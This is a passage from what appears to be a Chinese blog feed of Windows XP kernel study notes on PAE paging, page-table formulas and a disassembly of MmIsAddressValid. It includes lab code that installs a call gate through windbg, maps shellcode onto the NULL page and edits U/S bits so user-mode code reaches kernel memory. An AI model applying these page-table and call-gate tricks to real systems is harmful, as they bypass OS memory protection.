class="number">0x6A</span>,<span class="number">0x00</span>,<span class="number">0x6A</span>,<span class="number">0x00</span>,<span class="number">0x6A</span>,<span class="number">0x00</span>,<span class="number">0x6A</span>,<span class="number">0x00</span>,<span class="number">0xE8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>&#125;;</span><br><span class="line"></span><br><span class="line">VOID __declspec(naked) CallGate_SetPDEPTE()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">      </span><br><span class="line">		lea eax,ShellCode;</span><br><span class="line">		mov ebx,eax;</span><br><span class="line">		mov ecx,dword ptr ds:[<span class="number">0xC0300000</span>];</span><br><span class="line">		test ecx,ecx;	<span class="comment">//该处如果去挂PDE会发生失败，不知道为啥，AND</span></span><br><span class="line">		je __SetPDE;	<span class="comment">//实际代码运行的时候是jne，因为PDE不是0</span></span><br><span class="line">    </span><br><span class="line">		<span class="comment">//挂PTE</span></span><br><span class="line">		<span class="comment">//PTE = 0xC0000000 + PDI*4096 + PTI*4</span></span><br><span class="line">		<span class="comment">//4096 = 2^12</span></span><br><span class="line">		shr ebx,<span class="number">22</span>;</span><br><span class="line">		<span class="keyword">and</span> ebx,<span class="number">0x3FF</span>;		<span class="comment">//PDI</span></span><br><span class="line">		shl ebx,<span class="number">12</span>;     	<span class="comment">//PDI*4096</span></span><br><span class="line">		lea eax,ShellCode;</span><br><span class="line">		shr eax,<span class="number">12</span>;</span><br><span class="line">		<span class="keyword">and</span> eax,<span class="number">0x3FF</span>;		<span class="comment">//PTI</span></span><br><span class="line">		shl eax,<span class="number">2</span>;	    	<span class="comment">//PTI*4</span></span><br><span class="line">		add eax,<span class="number">0xC0000000</span>;	<span class="comment">//0xC0000000 + PTI*4</span></span><br><span class="line">		add eax,ebx;		<span class="comment">//eax = PTE = 0xC0000000 + PTI*4 + PDI*4096</span></span><br><span class="line">    </span><br><span class="line">		mov eax,dword ptr ds:[eax];</span><br><span class="line">		mov dword ptr ds:[<span class="number">0xC0000000</span>],eax;<span class="comment">//将ShellCode_PTE挂到NULL的PTE上去</span></span><br><span class="line">    </span><br><span class="line">		jmp __RET3;</span><br><span class="line">      </span><br><span class="line">	__SetPDE:</span><br><span class="line">		<span class="comment">//将线性地址ShellCode的PDE挂到NULL地址的PDE上去</span></span><br><span class="line">		<span class="comment">//ShellCode_PDE = 0xC0300000 + PDI*4</span></span><br><span class="line">		<span class="comment">//取线性地址高10位（PDI）</span></span><br><span class="line">		shr eax,<span class="number">22</span>;</span><br><span class="line">		<span class="keyword">and</span> eax,<span class="number">0x3FF</span>;			<span class="comment">//将多余的位清零仅保留最高10位</span></span><br><span class="line">		shl eax,<span class="number">2</span>;			<span class="comment">//PDI*4</span></span><br><span class="line">		add eax,<span class="number">0xC0300000</span>;		<span class="comment">//0xC0300000 + PDI*4</span></span><br><span class="line">    </span><br><span class="line">		mov edx,dword ptr ds:[eax];</span><br><span class="line">		mov dword ptr ds:[<span class="number">0xC0300000</span>],edx;<span class="comment">//将ShellCode_PDE挂到NULL的PDE上去</span></span><br><span class="line">    </span><br><span class="line">	__RET3:</span><br><span class="line">		popfd;</span><br><span class="line">		popad;</span><br><span class="line">		retf;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//填充E8 Call的代码 = 目的地址 - 返回地址（当前代码长度+当前代码基址）</span></span><br><span class="line">	DWORD dwOffset = (DWORD)ShellCode &amp; <span class="number">0xFFF</span>;</span><br><span class="line">	*(PDWORD)&amp;ShellCode[<span class="number">9</span>] = (DWORD)MessageBox - (<span class="number">13</span>+dwOffset);</span><br><span class="line">	BYTE CallGate[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	DWORD dwShellCode = (DWORD)ShellCode;</span><br><span class="line">	<span class="comment">//*(PDWORD)&amp;ShellCode[9] = (DWORD)MessageBox - (13+dwShellCode);</span></span><br><span class="line">  </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;CallGate_SetPDEPTE地址：%08X，MessageBox的地址：%08X\n&quot;</span>,(DWORD)CallGate_SetPDEPTE,(DWORD)MessageBox);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %04xec00`0008%04x\n&quot;</span>, ((DWORD)CallGate_SetPDEPTE&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x0000FFFF</span>,\</span><br><span class="line">         (DWORD)CallGate_SetPDEPTE &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">  </span><br><span class="line">	getchar();</span><br><span class="line">	__asm</span><br><span class="line">	  &#123;</span><br><span class="line">		call fword ptr ds:[CallGate];</span><br><span class="line">		call dwOffset;</span><br><span class="line">	  &#125;</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/03/yIhRYajNOdwM6Zt.png" alt="24.png"></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>保护模式</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 页保护（二）</title>
    <url>/post/WinXP-ProtectionMode-Page2/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-2-9-9-12分页"><a href="#1-2-9-9-12分页" class="headerlink" title="1 2-9-9-12分页"></a>1 2-9-9-12分页</h2><p>2-9-9-12分页结构（PAE，物理地址扩展）：</p>
<ul>
<li>12：页的大小是确定的，4KB不能随便改，所以12确定了。</li>
<li>9：如果想增大物理内存的访问范围，就需要增大<strong>PTE</strong>，增大到36位，考虑对齐的因素，增加到<strong>8个字节</strong>。4KB &#x3D; 512*8 &#x3D; 1024*4，512 &#x3D; 2^ 9。<mark class="label success">PTI</mark></li>
<li>9：如果PTE所在物理地址超过4GB，则同样也需要一个超过32位的PDE来进行寻址，考虑内存对齐，则PDE也是8字节。<mark class="label success">PDI</mark></li>
<li>2：2  &#x3D;  32 -（12+9+9），还剩2位，所以就再做一级叫<mark class="label success">PDPI</mark>。</li>
</ul>
<div class="note warning"><p>这里需要注意物理地址和线性地址：32位CPU的线性地址范围是32位，大小为4GB。在10-10-12分页模式下，物理地址和线性地址大小相等为4GB，那么在多进程情况下就需要不停的进行换物理页，为了节省换页的开销，Intel设计了2-9-9-12分页。但是Windows在这种分页模式下仅使用了36位来进行寻址方式，2^ 36 &#x3D; 64GB。注意：</p>
<ul>
<li>2-9-9-12分页模式下，线性地址范围还是4GB。</li>
<li>物理地址范围为64GB。</li>
<li>物理地址范围和内存条大小无关，有可能此时内存条大小仅为2GB。</li>
<li>物理地址大小由8字节的PTE中的36位来决定。</li>
<li>PDE也是8字节是因为PTE所在的物理页的物理地址可能超过4GB，同时考虑内存对齐。</li>
</ul>
</div>

<p><img data-src="https://s2.loli.net/2022/01/04/fdXsiAlHnm3PZ18.png" alt="25.png"></p>
<p>其中：<strong>CR3、物理页数据是以32位存放，PDPTE、PDE、PTE为64位</strong>。</p>
<h3 id="1-1-开启2-9-9-12分页"><a href="#1-1-开启2-9-9-12分页" class="headerlink" title="1.1 开启2-9-9-12分页"></a>1.1 开启2-9-9-12分页</h3><ul>
<li>10-10-12分页：将<code>C:\boot.ini</code>文件中的<code>noexecute</code>改为<code>execute</code>重启。</li>
<li>2-9-9-12分页：将<code>C:\boot.ini</code>文件中的<code>execute</code>改为<code>noexecute</code>重启。</li>
</ul>
<h3 id="1-2-PDPE-2"><a href="#1-2-PDPE-2" class="headerlink" title="1.2 PDPE(2)"></a>1.2 PDPE(2)</h3><p>由于CR3是32位的，所以PDPTE所在物理页的<strong>物理地址</strong>范围是0-4GB。</p>
<p>PDPT表（页目录指针表）是2-9-9-12分页模式下的线性地址的高两位，共组成四项PDPTE。<strong>PDPE结构</strong>如下：</p>
<p><img data-src="https://s2.loli.net/2022/01/05/l6JxzEvBt4Q9Kpa.png" alt="26.png"></p>
<p>每个PDPTE为8字节：</p>
<ol>
<li>0～11：属性，也是PDE的偏移。</li>
<li>9～11：给操作系统用的，CPU不用。</li>
<li>12～35：PDT的基址，把低12位补0，<mark class="label primary">0-35：共36位为PDT基址</mark>。</li>
<li>36～63：保留位，保留位并不意味着填0就行了，而是CPU要用的，但是我们不能用，并且CPU用了还不会告诉我们怎么用的。</li>
</ol>
<h3 id="1-3-PDE-9"><a href="#1-3-PDE-9" class="headerlink" title="1.3 PDE(9)"></a>1.3 PDE(9)</h3><p>每个PDT表（页目录表）大小为4KB，共512个PTE，每个PTE为8字节。</p>
<p>PDE根据PS位来区分是大页还是小页：</p>
<ul>
<li>PS &#x3D; 1：大页，剩下的9+12&#x3D;21位，即2^ 21&#x3D;2MB为 1 页。此时PDE中的G位才有意义：<ul>
<li>G &#x3D; 1，表示全局页，是多个进程共享的，与TLB相关。</li>
<li>G &#x3D; 0，非全局页（独享页），如VirtualAlloc申请的内存。</li>
</ul>
</li>
<li>PS &#x3D; 0，PDE指向页表，每个物理页大小4KB，<strong>此时G位是无效位，一直为0</strong>。</li>
</ul>
<p><strong>G&#x3D;1，即为全局页，进程（CR3）切换时，TLB中的记录不会被刷新。</strong></p>
<p>4KB物理页下：<mark class="label primary">0-35：共36位为PTT基址</mark></p>
<p><strong>PDE</strong>大页、小页的结构图如下：（低36位为页表基址）</p>
<p><img data-src="https://s2.loli.net/2022/01/05/ORKa3UlpH4bzMGy.png" alt="27.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/05/1p5tfOjRWld64Fk.png" alt="28.png"></p>
<ul>
<li><p>VirtualAlloc申请的内存是独享内存，仅当前进程可用</p>
</li>
<li><p>CreateFileMapping申请的是共享物理页，所有进程都可以使用，如放DLL的内存</p>
</li>
</ul>
<h3 id="1-4-PTE-9"><a href="#1-4-PTE-9" class="headerlink" title="1.4 PTE(9)"></a>1.4 PTE(9)</h3><p>PTT表（页表），PTE结构如下：</p>
<p><img data-src="https://s2.loli.net/2022/01/05/OxFfnzJ3oUtXakI.png" alt="29.png"></p>
<p>PTE中35-12是物理页基址，24位，低12位补0：<mark class="label primary">物理页基址+12位的页内偏移指向具体数据，共36位</mark>。<strong>具体的物理数据是按32位存放的</strong>。</p>
<h3 id="1-5-XD标志位-63"><a href="#1-5-XD标志位-63" class="headerlink" title="1.5 XD标志位[63]"></a>1.5 XD标志位[63]</h3><mark class="label warning">在PAE分页模式下，PDE与PTE的最高位为XD/NX位</mark>，AMD中称为NX位,即No Excetion。<mark class="label danger">DEP</mark>就是PDE、PTE最高位X位。（DEP保护）

<p><img data-src="https://s2.loli.net/2022/01/05/LTKSrXAn5W1oD9P.png" alt="30.png"></p>
<p>段的属性有可读、可写和可执行。<br>页的属性有可读、可写。<br>所以，Intel就做了硬件保护（保护数据），做了一个不可执行位：</p>
<ul>
<li>XD &#x3D; 1：该物理页数据不可执行。即使软件溢出了也没有关系，即使你的EIP蹦到了危险的“数据区”，也是不可以执行的！</li>
</ul>
<h3 id="1-6-PDPTE、PDE、PTE的属性"><a href="#1-6-PDPTE、PDE、PTE的属性" class="headerlink" title="1.6 PDPTE、PDE、PTE的属性"></a>1.6 PDPTE、PDE、PTE的属性</h3><p>除了G位和XD位属性为OR外，其余属性为： <strong>PDPTE属性 &amp; PDE属性 &amp; PTE属性</strong>。</p>
<h3 id="1-7-PDT、PTT表"><a href="#1-7-PDT、PTT表" class="headerlink" title="1.7 PDT、PTT表"></a>1.7 PDT、PTT表</h3><p>2-9-9-12分页下的PDT、PTT表结构如下：</p>
<p><img data-src="https://s2.loli.net/2022/01/05/hQyL86o3Wae7XTR.png" alt="33.png"></p>
<p>根据示意图，<code>0xC0000000</code>是第一张页表的线性地址，<code>0xC0600000</code>是第一张页目录表的线性地址。</p>
<p>PDT表共4张，每张4KB。</p>
<div class="note info"><p>2-9-9-12：<br>PDPTI-PDI-PTI-OFFSET                    </p>
<p>公式：<br><strong>PDE &#x3D; 0xc0600000 + (PDPTI*4KB) + (PDI*8)</strong><br><strong>PTE &#x3D; 0xc0000000 + (PDPTI*2MB) + (PDI*4KB) + (PTI*8)</strong>                    </p>
<p>更高效的公式（MmIsAddressValid是这么干的）<br>PDE &#x3D; 0xc0600000 + ((addr &gt;&gt; 18) &amp; 0x3ff8)<br>PTE &#x3D; 0xc0000000 + ((addr &gt;&gt; 9) &amp; 0x7ffff8)</p>
</div>

<h3 id="1-8-练习：找一个线性地址对应的物理地址"><a href="#1-8-练习：找一个线性地址对应的物理地址" class="headerlink" title="1.8 练习：找一个线性地址对应的物理地址"></a>1.8 练习：找一个线性地址对应的物理地址</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">  DWORD dwNumber = <span class="number">0x12345678</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;变量dwNumber的线性地址为：%p\n&quot;</span>,&amp;dwNumber);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>开启2-9-9-12分页：将XP<code>C:\boot.ini</code>文件中的<code>execute</code>改为<code>noexecute</code>重启。</li>
<li>运行程序，线性地址为：0x0012FF7C，进行2-9-9-12拆分：<ul>
<li>2：00 &#x3D; 0x0 * 8 &#x3D; 0x0</li>
<li>9：00 0000 000 &#x3D; 0x0 * 8 &#x3D; 0x0</li>
<li>9：1 0010 1111 &#x3D; 0x12F * 8 &#x3D; 0x978</li>
<li>12：0xF7C</li>
</ul>
</li>
<li>在Windbg中使用<code>!process 0 0</code>获取当前进程CR3的值：0x06e40340（4字节物理地址）<ol>
<li>查PDPTE：<code>!dq 0x06e40340 + 0x0</code>：00000000&#96;18403801。</li>
<li>查PDE：取PDPTE的低36位作为基址查PDE：0x018403801，然后将低12位属性清零，<code>!dq 0x018403000 + 0x0</code>：00000000&#96;184f1867。</li>
<li>查PTE：取PDE的低36位作为基址查PTE：0x0184f1867，然后将低12位属性清零，<code>!dq 0x0184f1000 + 0x978</code>：80000000&#96;1844c867。</li>
<li>查物理页中的数据：取PTE的低36位作为基址查物理页数据：0x01844c867，然后将低12位属性清零。因为物理页是4字节的：<code>!dd 0x01844c000 + 0xF7C </code>：12345678。</li>
</ol>
</li>
<li>使用 !vtop 指令验证线性地址转换为物理地址是否正确。<code>!vtop CR3 线性地址</code></li>
</ol>
<p><img data-src="https://s2.loli.net/2022/01/05/8dfahMQEwSyjNAn.png" alt="31.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/05/TrSBws7gEMZhaWb.png" alt="32.png"></p>
<h3 id="1-9-练习：给NULL挂上物理页"><a href="#1-9-练习：给NULL挂上物理页" class="headerlink" title="1.9 练习：给NULL挂上物理页"></a>1.9 练习：给NULL挂上物理页</h3><p>注意：如果NULL的PDE项不为0，则直接修改NULL的PTE即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">  DWORD dwNumber = <span class="number">0x12345678</span>;</span><br><span class="line">  PDWORD p = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;变量dwNumber的线性地址为：0x%P，请在windbg中给NULL挂物理页：\n&quot;</span>,&amp;dwNumber);</span><br><span class="line">  getchar();<span class="comment">//修改NULL的PTE，给NULL挂物理页</span></span><br><span class="line">  </span><br><span class="line">  DWORD dwNull = *p;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;线性地址NULL中的值为：%x\n&quot;</span>,dwNull);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>运行程序获取变量dwNumber的线性地址：0x0012FF7C。</p>
</li>
<li><p>获取CR3的值<code>!process 0 0</code>：0x06e401c0。</p>
</li>
<li><p>按2-9-9-12拆分线性地址NULL(0)、0x0012FF7C。</p>
<ol>
<li><p>NULL：<code>!vtop 0x06e401c0 0x0</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">X86VtoP: Virt <span class="number">00000000</span>, pagedir <span class="number">6e401</span>c0</span><br><span class="line">X86VtoP: PAE PDPE <span class="number">6e401</span>c0 - <span class="number">00000000</span>`<span class="number">223</span>d9801</span><br><span class="line">X86VtoP: PAE PDE <span class="number">223</span>d9000 - <span class="number">00000000</span>`<span class="number">224</span>c7867</span><br><span class="line">X86VtoP: PAE PTE <span class="number">224</span>c7000 - <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">X86VtoP: PAE zero PTE</span><br></pre></td></tr></table></figure>
</li>
<li><p>0x0012FF7C：<code>!vtop 0x06e401c0 0x0012FF7C</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">X86VtoP: Virt <span class="number">0012f</span>f7c, pagedir <span class="number">6e401</span>c0</span><br><span class="line">X86VtoP: PAE PDPE <span class="number">6e401</span>c0 - <span class="number">00000000</span>`<span class="number">223</span>d9801</span><br><span class="line">X86VtoP: PAE PDE <span class="number">223</span>d9000 - <span class="number">00000000</span>`<span class="number">224</span>c7867</span><br><span class="line">X86VtoP: PAE PTE <span class="number">224</span>c7978 - <span class="number">80000000</span>`<span class="number">2235</span>c867</span><br><span class="line">X86VtoP: PAE Mapped phys <span class="number">2235</span>cf7c</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>可以看到NULL的PDE不为空，则直接修改PTE即可：由于<code>!eq</code>指令没法使用，则<code>!ed 0x224c7000 0x2235c867 </code>，<code>!ed 0x224c7004 0x80000000</code>。</p>
</li>
<li><p>此时再查看：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !vtop <span class="number">0x06e401c0</span> <span class="number">0x0</span></span><br><span class="line">X86VtoP: Virt <span class="number">00000000</span>, pagedir <span class="number">6e401</span>c0</span><br><span class="line">X86VtoP: PAE PDPE <span class="number">6e401</span>c0 - <span class="number">00000000223</span>d9801</span><br><span class="line">X86VtoP: PAE PDE <span class="number">223</span>d9000 - <span class="number">00000000224</span>c7867</span><br><span class="line">X86VtoP: PAE PTE <span class="number">224</span>c7000 - <span class="number">800000002235</span>c867</span><br><span class="line">X86VtoP: PAE Mapped phys <span class="number">2235</span>c000</span><br></pre></td></tr></table></figure>
</li>
<li><p>回到XP的VC6中继续执行代码。</p>
<p><img data-src="https://s2.loli.net/2022/01/05/RXY31Qhey5wpfm8.png" alt="34.png"><img data-src="https://s2.loli.net/2022/01/05/NWO9DwXk7Jb8AuH.png" alt="35.png"></p>
</li>
</ol>
<h3 id="1-a-练习：修改页属性读写高2G地址"><a href="#1-a-练习：修改页属性读写高2G地址" class="headerlink" title="1.a 练习：修改页属性读写高2G地址"></a>1.a 练习：修改页属性读写高2G地址</h3><p>除了<mark class="label success">G</mark>位和<mark class="label warning">XD</mark>位属性为<mark class="label danger">OR</mark>外，其余属性为： <strong>PDPTE属性 &amp; PDE属性 &amp; PTE属性</strong>。</p>
<p>要想在3环读写高2G地址，除了段中学到的提权外，还可以使用页的手段：改<strong>U&#x2F;S位，和PTE的G位</strong>。</p>
<div class="note primary"><p>G位和TLB及PS位有关（PDE、PTE均包含G、PS位）：</p>
<ol>
<li>PDE的PS &#x3D; 0（小页4KB），G位在PDE中无效。</li>
<li>由于G位的属性是：<mark class="label success">PDE_G | PTE_G</mark>，当PTE的G &#x3D; 1时，表示该物理页有缓存（使用了快表TLB），故要想使U&#x2F;S修改后生效，<strong>要保证PTE中的G &#x3D; 0</strong>。</li>
</ol>
</div>

<p>题目：在3环写代码读写线性地址：0x8003f048。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;请在windbg中修改线性地址0x8003f048 PDE、PTE的U/S位及PTE的G位：\n&quot;</span>);</span><br><span class="line">  getchar();<span class="comment">//修改NULL的PTE，给NULL挂物理页</span></span><br><span class="line">  </span><br><span class="line">  PDWORD p = (PDWORD)<span class="number">0x8003f048</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;线性地址0x8003f048中的值为：%x\n&quot;</span>,*p);<span class="comment">//读</span></span><br><span class="line">  *p = <span class="number">0x12345678</span>;<span class="comment">//写</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;线性地址0x8003f048中的值为：%x\n&quot;</span>,*p);<span class="comment">//读      </span></span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>运行程序，并使用<code>!process 0 0</code>获取CR3的值：0x06e401c0。</p>
</li>
<li><p>拆分线性地址0x8003f048：<code>!vtop 0x06e401c0 0x8003f048</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">X86VtoP: Virt <span class="number">8003f</span>048, pagedir <span class="number">6e401</span>c0</span><br><span class="line">X86VtoP: PAE PDPE <span class="number">6e401</span>d0 - <span class="number">00000000</span>`<span class="number">2556f</span>801</span><br><span class="line">X86VtoP: PAE PDE <span class="number">2556f</span>000 - <span class="number">00000000</span>`<span class="number">00b</span>17163</span><br><span class="line">X86VtoP: PAE PTE b171f8 - <span class="number">00000000</span>`<span class="number">0003f</span>163</span><br><span class="line">X86VtoP: PAE Mapped phys <span class="number">3f</span>048</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以看到PDE、PTE下标2(低3位)的U&#x2F;S为0（特权用户），需要修改为1。PTE下标8(低9位)G位为1，需要修改为0。</p>
<ul>
<li>修改PDE：<code>!ed 0x2556f000 0x00b17167</code>。</li>
<li>修改PTE：<code>!ed 0x00b171f8 0x0003f067</code>。</li>
</ul>
</li>
<li><p>回到XP的VC6继续执行代码。</p>
<p><img data-src="https://s2.loli.net/2022/01/05/HXQYzlycweShIKE.png" alt="36.png"></p>
</li>
</ol>
<h3 id="1-b-逆向分析函数MmIsAddressValid"><a href="#1-b-逆向分析函数MmIsAddressValid" class="headerlink" title="1.b 逆向分析函数MmIsAddressValid"></a>1.b 逆向分析函数MmIsAddressValid</h3><p>内核函数<code>MmIsAddressValid</code>的作用：验证一个线性地址是否有效。</p>
<p>在MSDN是这样说的：The <strong>MmIsAddressValid</strong> routine checks whether a page fault will occur for a read or write operation at a given virtual address.（<strong>MmIsAddressValid</strong>例程检查给定虚拟地址的读写操作是否会发生页面错误。）</p>
<p>找函数方法：</p>
<p>方法一：在windbg中输入 <code>u MmIsAddressValid L41</code>或<code>uf MmIsAddressValid</code>。</p>
<p><strong>方法二：</strong>在C:\Windows\System32\ 中找到内核程序，用IDA分析。</p>
<ul>
<li>2-9-9-12分页内核：ntkrnlpa.exe</li>
<li>10-10-12分页内核：ntoskrnl.exe</li>
</ul>
<p>函数分析：</p>
<ol>
<li><code>mov edi,edi</code> ：正式分析前，先聊聊函数头的 <code>mov edi,edi</code> 指令。这条指令看起来什么也没做，但是很多系统函数开头都有这条指令，why？其实这是为了实现对函数行为的动态修改（热补丁，Hot-Patching），且执行一条MOV指令比执行两条NOP指令花费更少的时间。可以一下这篇文章 <a href="https://blog.csdn.net/swanabin/article/details/17550897">函数开始处的MOV EDI, EDI的作用</a>。</li>
<li><code>align 8</code>：数据8字节对齐。</li>
<li><code>bp-based frame</code>：使用 EBP 寻址。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0043</span>C921 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0043</span>C922                 align <span class="number">8</span>			<span class="comment">//数据8字节对齐</span></span><br><span class="line">.text:<span class="number">0043</span>C928 ; Exported entry <span class="number">685.</span> MmIsAddressValid</span><br><span class="line">.text:<span class="number">0043</span>C928</span><br><span class="line">.text:<span class="number">0043</span>C928 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">0043</span>C928</span><br><span class="line">.text:<span class="number">0043</span>C928 ; Attributes: bp-based frame		<span class="comment">//使用 EBP 寻址</span></span><br><span class="line">.text:<span class="number">0043</span>C928</span><br><span class="line">.text:<span class="number">0043</span>C928 ; <span class="function">BOOLEAN __stdcall <span class="title">MmIsAddressValid</span><span class="params">(PVOID VirtualAddress)</span></span></span><br><span class="line"><span class="function">.text:0043C928                 <span class="keyword">public</span> MmIsAddressValid</span></span><br><span class="line"><span class="function">.text:0043C928 MmIsAddressValid proc near              </span>; CODE XREF: sub_41AD5A+<span class="number">2F</span>↑p</span><br><span class="line">.text:<span class="number">0043</span>C928                                         ; sub_41ADAC+<span class="number">29</span>↑p ...</span><br><span class="line">.text:<span class="number">0043</span>C928</span><br><span class="line">.text:<span class="number">0043</span>C928 var_8           = dword ptr <span class="number">-8</span>		<span class="comment">//局部变量2</span></span><br><span class="line">.text:<span class="number">0043</span>C928 var_4           = dword ptr <span class="number">-4</span>		<span class="comment">//局部变量1</span></span><br><span class="line">.text:<span class="number">0043</span>C928 VirtualAddress  = dword ptr  <span class="number">8</span>		<span class="comment">//参数1，EBP+8</span></span><br><span class="line">.text:<span class="number">0043</span>C928</span><br><span class="line">.text:<span class="number">0043</span>C928                 mov     edi, edi		<span class="comment">//Hot-Patching</span></span><br><span class="line">.text:<span class="number">0043</span>C92A                 push    ebp</span><br><span class="line">.text:<span class="number">0043</span>C92B                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">0043</span>C92D                 push    ecx		<span class="comment">//保存 ECX 的值，同时为局部变量1留坑位</span></span><br><span class="line">.text:<span class="number">0043</span>C92E                 push    ecx		<span class="comment">//保存 ECX 的值，同时为局部变量2留坑位</span></span><br><span class="line">.text:<span class="number">0043</span>C92F                 mov     ecx, [ebp+VirtualAddress]<span class="comment">//取参数VirtualAddress，线性地址，ecx = VAddr</span></span><br><span class="line">.text:<span class="number">0043</span>C932                 push    esi</span><br><span class="line">.text:<span class="number">0043</span>C933                 mov     eax, ecx		<span class="comment">//eax = VAddr</span></span><br><span class="line">.text:<span class="number">0043</span>C935                 shr     eax, <span class="number">12</span>h		<span class="comment">//VAddr&gt;&gt;18</span></span><br><span class="line">.text:<span class="number">0043</span>C938                 mov     esi, <span class="number">3F</span>F8h	<span class="comment">//0011 1111 1111 1000，2--0011左移12位，9--111111111左移3位</span></span><br><span class="line">.text:<span class="number">0043</span>C93D                 <span class="keyword">and</span>     eax, esi		<span class="comment">//eax = PDPTI * 4KB + PDI * 8</span></span><br><span class="line">.text:<span class="number">0043</span>C93F                 sub     eax, <span class="number">3F</span>A00000h	<span class="comment">//eax = C0600000 + PDPTI * 4KB + PDI * 8</span></span><br><span class="line">.text:<span class="number">0043</span>C93F						<span class="comment">//eax指向PDE</span></span><br><span class="line">.text:<span class="number">0043</span>C944                 mov     edx, [eax]	<span class="comment">//edx = PDE低4字节</span></span><br><span class="line">.text:<span class="number">0043</span>C946                 mov     eax, [eax+<span class="number">4</span>]	<span class="comment">//eax = PDE高4字节</span></span><br><span class="line">.text:<span class="number">0043</span>C949                 mov     [ebp+var_4], eax	<span class="comment">//局部变量1为PDE高4字节</span></span><br><span class="line">.text:<span class="number">0043</span>C94C                 mov     eax, edx		<span class="comment">//eax = edx = PDE低4字节</span></span><br><span class="line">.text:<span class="number">0043</span>C94E                 push    edi</span><br><span class="line">.text:<span class="number">0043</span>C94F                 <span class="keyword">and</span>     eax, <span class="number">1</span>		<span class="comment">//取PDE的P位</span></span><br><span class="line">.text:<span class="number">0043</span>C952                 <span class="keyword">xor</span>     edi, edi</span><br><span class="line">.text:<span class="number">0043</span>C954                 <span class="keyword">or</span>      eax, edi		<span class="comment">//判断P = 0？</span></span><br><span class="line">.text:<span class="number">0043</span>C956                 jz      <span class="keyword">short</span> loc_43C9B9	<span class="comment">//if (P==0) 返回假，返回0</span></span><br><span class="line">.text:<span class="number">0043</span>C958                 mov     edi, <span 